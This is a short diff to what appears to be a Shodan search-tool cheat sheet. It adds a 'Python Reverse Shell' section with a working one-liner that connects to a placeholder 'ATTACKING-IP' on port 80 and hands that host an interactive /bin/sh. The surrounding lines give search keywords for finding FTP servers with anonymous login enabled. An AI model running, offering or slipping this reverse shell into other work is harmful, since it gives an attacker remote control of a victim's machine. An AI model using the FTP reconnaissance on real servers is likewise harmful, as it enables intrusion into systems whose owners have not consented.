@@ -422,6 +422,12 @@ for item in r:
 2. Note : Use shodan_eye.py to search for FTP servers that have the ```anon``` login enabled.
 3. Search Keyword : ```230 anonymous```
 
+# Python Reverse Shell:
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
 # Cloud:
 
 ## AWS:
